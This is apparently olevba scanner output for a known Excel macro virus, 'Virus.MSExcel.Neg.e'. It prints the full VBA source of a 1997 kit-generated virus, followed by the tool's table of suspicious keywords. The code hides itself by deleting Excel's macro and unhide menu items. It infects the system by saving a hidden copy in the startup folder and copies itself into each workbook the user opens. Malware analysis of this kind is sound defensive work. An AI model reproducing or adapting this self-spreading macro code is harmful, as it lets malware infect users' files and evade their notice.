olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Neg.e-62abae75526b0837a5c2df817fc23f5dc4856420
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NEG02.bas 
in file: Virus.MSExcel.Neg.e-62abae75526b0837a5c2df817fc23f5dc4856420 - OLE stream: '_VBA_PROJECT_CUR/VBA/NEG02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































'------------ >>>> BEGIN CUT! <<<< --------------
'------------------------------------------------
'Generated with NEG !!. Please include this text
'------------------------------------------------
'NEG is Trademark of NoMercy
'Date generated  : 25- 12- 1997
'VirusName:  Test02
'Author:  Foxz/NEG
'Module Name:  NEG02
'Template: N-E-G.XLM

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
'>>---------------------------------[Begin Stealth Routine]-----
MenuBars(xlWorksheet).Reset
MenuBars(xlModule).Reset
MenuBars(xlNoDocuments).Reset
MenuBars(xlInfo).Reset
MenuBars(xlChart).Reset
MenuBars(xlWorksheet).Menus("Tools").MenuItems("---").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("--").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Delete...").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlWorksheet).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("---").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("--").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlChart).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("Assig&n Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("--").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Record New Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Unhide...").Delete
'>>---------------------------------[End of Stealth Routine]-----
    
    
'>>---------------------------------[Begin Infection Routine]-----
If cek_global() Then 'check on global!
    GoTo FuckSheet:                                       'found?
Else
    infectglobal     'Lound the speaker we want dance :)
End If
FuckSheet:
Application.OnSheetActivate = "N-E-G.XLM!Fuck"
bye:
End Sub

Function cek_global() As Boolean
Attribute cek_global.VB_ProcData.VB_Invoke_Func = " \n14"
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "N-E-G.XLM" Then
    For y = 1 To Application.Workbooks("N-E-G.XLM").Modules.Count
        If Application.Workbooks("N-E-G.XLM").Modules(y).Name = "NEG02" Then
            cek_global = True
        End If
    Next y
    End If
Next x
End Function

Function infectglobal()
Attribute infectglobal.VB_ProcData.VB_Invoke_Func = " \n14"
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\N-E-G.XLM"
  Workbooks.Open (Application.StartupPath + "\N-E-G.XLM")
  Windows("N-E-G.XLM").Visible = False
 Application.Workbooks("N-E-G.XLM").Save
End Function

Function inFuckIt() As Boolean
Attribute inFuckIt.VB_ProcData.VB_Invoke_Func = " \n14"
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "NEG02" Then
            inFuckIt = True
   End If
Next y
End Function

Sub Fuck()
Attribute Fuck.VB_ProcData.VB_Invoke_Func = " \n14"
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then 'already fucked?
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("N-E-G.XLM").Visible = True
    Workbooks("N-E-G.XLM").Activate
    Sheets("NEG02").Visible = True
    Workbooks("N-E-G.XLM").Sheets("NEG02").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("NEG02").Visible = False
    Workbooks("N-E-G.XLM").Sheets("NEG02").Visible = False
    Windows("N-E-G.XLM").Visible = False
bye2:
Close
End Sub
'>>---------------------------------[End of Infection Routine]-----

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("N-E-G.XLM").Save
If Day(Date) = "13" Then
'>>---------------------------------[Begin of Your Massages Routine]-----
    MsgBox "This  XM.N-E-G   generated with  NEG ,  the world first  Excel Generator!", 48
'>>---------------------------------[End of Your Massages Routine]-----
Else
End If
bye3:
End Sub
'------------ >>>>  END CUT! <<<< -----------
'Thank's for Using NoMercy Product!

-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Neg.e-62abae75526b0837a5c2df817fc23f5dc4856420 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  NEG0
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

